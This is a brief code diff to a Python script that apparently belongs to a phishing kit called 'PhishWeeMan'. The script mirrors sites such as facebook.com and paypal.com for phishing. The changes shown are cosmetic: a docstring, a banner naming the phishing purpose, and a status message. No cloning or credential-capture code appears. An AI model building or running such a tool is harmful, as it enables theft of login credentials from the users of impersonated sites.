@@ -31,7 +31,7 @@ USER_AGENT = 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot
 
 
 class run_server(object):
-	""""""
+	"""Create the PythonSimpleModule"""
 	
 	def __init__(self, website, port):
 		self.website = website
@@ -58,6 +58,7 @@ class run_server(object):
 
 
 def menu():
+	notify("PhishWeeMan: %s - Create mirror site for Phishing" %(MODULE_VERSION))
 	print "\033[01;33m"
 	print "=> 1. facebook.com"
 	print "=> 2. paypal.com"
@@ -102,7 +103,7 @@ def main():
 	try:
 		run()
 	except KeyboardInterrupt:
-		notify("Server stopped.., Interrupt")
+		notify("\nServer stopped.., Interrupt")
 		cleanup()
 	except Exception as e:
 		notify("\n Server Stopped..")
